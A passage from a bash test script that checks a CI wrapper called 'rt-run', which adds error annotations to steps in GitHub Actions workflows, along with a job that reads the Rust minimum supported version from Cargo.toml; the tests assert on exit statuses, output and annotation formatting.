  out=$(python3 - "$wrapped" "$ROOT"/.github/workflows/{python,node,rust,jvm,terraform,ansible,shell}.yml <<'PY'
import os, re, sys, yaml
dest, files = sys.argv[1], sys.argv[2:]
scripts, problems = set(), []
for f in files:
    wf = os.path.basename(f)
    for job_id, job in yaml.safe_load(open(f))["jobs"].items():
        steps = job.get("steps", [])
        setup = [s for s in steps if s.get("name") == "Set up failure annotations"]
        users = [s for s in steps if str(s.get("shell", "")).startswith("rt-run ")]
        if users and not setup:
            problems.append(f"{wf}:{job_id} uses rt-run without setting it up")
        for s in setup:
            m = re.search(r"<<'RT_EOF'\n(.*?)\nRT_EOF\n", s["run"], re.S)
            scripts.add(m.group(1) + "\n")
        for i, s in enumerate(users):
            if not s["shell"].endswith(" {0}"):
                problems.append(f"{wf}:{job_id}:{s['name']}: shell must end in {{0}}")
            open(os.path.join(dest, f"{wf}-{job_id}-{i}.sh"), "w").write(s["run"])
open(os.path.join(dest, "rt-run"), "w").write(next(iter(scripts)))
print(len(scripts))
print("\n".join(problems))
PY
  )
  assert_eq "rt-run script identical in every workflow" "1" "$(head -n1 <<<"$out")"
  assert_eq "every job using rt-run sets it up" "" "$(tail -n +2 <<<"$out")"
  chmod +x "$wrapped/rt-run"
  if command -v shellcheck >/dev/null; then
    # actionlint only shellchecks steps whose shell is bash, so check these here
    # (SC1091: sourced helpers live on the runner; actionlint skips it too).
    if out=$(shellcheck -s bash -e SC1091,SC2148 "$wrapped"/*.sh "$wrapped/rt-run" 2>&1); then
      pass "steps run through rt-run pass shellcheck"
    else
      fail "steps run through rt-run pass shellcheck" "$out"
    fi
  fi
  printf '%s\n' 'echo "   Compiling foo v1.0.0"' 'echo noise' \
    "printf '\\033[1;31merror[E0308]\\033[0m: mismatched types (100%%)\\n'" 'echo "  --> src/main.rs:3:5"' \
    'false' 'echo not reached' >"$wrapped/fail.sh"
  if out=$("$wrapped/rt-run" Lint "$wrapped/fail.sh" 2>&1); then rc=0; else rc=$?; fi
  assert_eq "rt-run keeps the step's exit status" "1" "$rc"
  assert_contains "step output still printed" "noise" "$out"
  assert_contains "annotation from the first diagnostic, colour stripped, escaped" \
    "::error title=Lint failed (exit 1)::error[E0308]: mismatched types (100%25)%0A  --> src/main.rs:3:5" "$out"
  assert_not_contains "-e stops the script, as with GitHub's bash" "not reached" "$out"
  printf '%s\n' 'echo one' 'echo two' 'exit 3' >"$wrapped/plain.sh"
  out=$("$wrapped/rt-run" Extra checks "$wrapped/plain.sh" 2>&1) || rc=$?
  assert_eq "exit status passed through" "3" "$rc"
  assert_contains "no diagnostic: end of output; multi-word title" "::error title=Extra checks failed (exit 3)::one%0Atwo" "$out"
  printf '%s\n' 'echo fine' >"$wrapped/ok.sh"
  out=$("$wrapped/rt-run" Test "$wrapped/ok.sh" 2>&1)
  assert_eq "success: output only, no annotation" "fine" "$out"
  printf '%s\n' 'false | true' >"$wrapped/pipe.sh"
  if "$wrapped/rt-run" Test "$wrapped/pipe.sh" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  assert_eq "pipefail, as with GitHub's bash" "1" "$rc"
fi

echo
echo "Rust MSRV job"
if command -v python3 >/dev/null && python3 -c 'import yaml' 2>/dev/null; then
  python3 - "$ROOT/.github/workflows/rust.yml" >"$(rt_tmpdir)/read-msrv.sh" <<'PY'
import sys, yaml
steps = yaml.safe_load(open(sys.argv[1]))["jobs"]["msrv"]["steps"]
print(next(s["run"] for s in steps if s.get("id") == "msrv"), end="")
PY
  read_msrv() { # CARGO_TOML_CONTENT -> the version output
    local d
    d=$(mktemp -d "$(rt_tmpdir)/msrv.XXXXXX")
    printf '%s\n' "$1" >"$d/Cargo.toml"
    (cd "$d" && GITHUB_OUTPUT="$d/out" bash -eo pipefail "$(rt_tmpdir)/read-msrv.sh" >/dev/null && cat "$d/out")
  }
  assert_eq "rust-version from [package]" "version=1.88" \
    "$(read_msrv $'[package]\nname = "x"\nedition = "2021"\nrust-version = "1.88"\n\n[dependencies]\nrand = "0.9"')"
  assert_eq "rust-version from [workspace.package]" "version=1.80.1" \
    "$(read_msrv $'[workspace]\nmembers = ["a"]\n\n[workspace.package]\nrust-version = "1.80.1" # MSRV')"
  assert_eq "no rust-version -> empty, job does nothing" "version=" "$(read_msrv $'[package]\nname = "x"')"
fi
out=$(RT_CONF=() && rt_list_workflows "$(new_repo)" "$(printf 'rust\t.\n')")
assert_contains "compare lists the MSRV job" "msrv: cargo check --workspace on Cargo.toml rust-version" "$out"

echo
printf '%d passed, %d failed\n' "$PASS" "$FAIL"
((FAIL == 0))
